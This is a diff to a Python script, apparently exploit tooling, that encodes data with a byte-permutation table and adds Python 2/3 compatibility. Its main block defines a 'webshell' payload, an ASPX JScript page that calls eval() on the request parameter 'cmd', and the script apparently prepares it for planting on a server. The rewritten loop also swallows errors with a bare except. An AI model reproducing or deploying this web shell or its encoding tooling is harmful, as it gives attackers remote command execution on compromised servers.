@@ -1,8 +1,9 @@
 #!/usr/bin/python
 #coding: UTF-8
 
-from io import BytesIO
 import base64
+import six
+from io import BytesIO
 
 DWORD_SIZE = 4
 
@@ -112,38 +113,24 @@ mpbbI = mpbbCrypt[512:]
 
 def cryptpermute(data, encrypt=False):
     table = mpbbR if encrypt else mpbbI
-    tmp = [table[v] for v in data]
+    tmp = [table[v] for v in data] if six.PY3 else [table[ord(v)] for v in data]
     i = 0
-    stream = BytesIO(bytes(tmp))
+    buf = bytes(tmp) if six.PY3 else bytearray(tmp)
+    stream = BytesIO(buf)
     while True:
         b = stream.read(DWORD_SIZE)
+        try:
+            tmp[i] = b[0]
+            tmp[i + 1] = b[1]
+            tmp[i + 2] = b[2]
+            tmp[i + 3] = b[3]
+            i += DWORD_SIZE
+        except:
+            pass
         if len(b) != DWORD_SIZE:
             break
-        tmp[i] = b[0]
-        tmp[i + 1] = b[1]
-        tmp[i + 2] = b[2]
-        tmp[i + 3] = b[3]
-        i += DWORD_SIZE
 
-    return bytes(tmp)
-
-def permute(data, encrypt=False):
-    table = mpbbR if encrypt else mpbbI
-    tmp = [table[v] for v in data]
-
-    i = 0
-    stream = BytesIO(bytes(tmp))
-    while True:
-        b = stream.read(DWORD_SIZE)
-        if len(b) != DWORD_SIZE:
-            break
-        tmp[i] = table[b[0]]
-        tmp[i + 1] = table[b[1]]
-        tmp[i + 2] = table[b[2]]
-        tmp[i + 3] = table[b[3]]
-        i += DWORD_SIZE
-
-    return bytes(tmp)
+    return bytes(tmp) if six.PY3 else ''.join(tmp)
 
 if __name__ == "__main__":
     webshell = b"<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>"
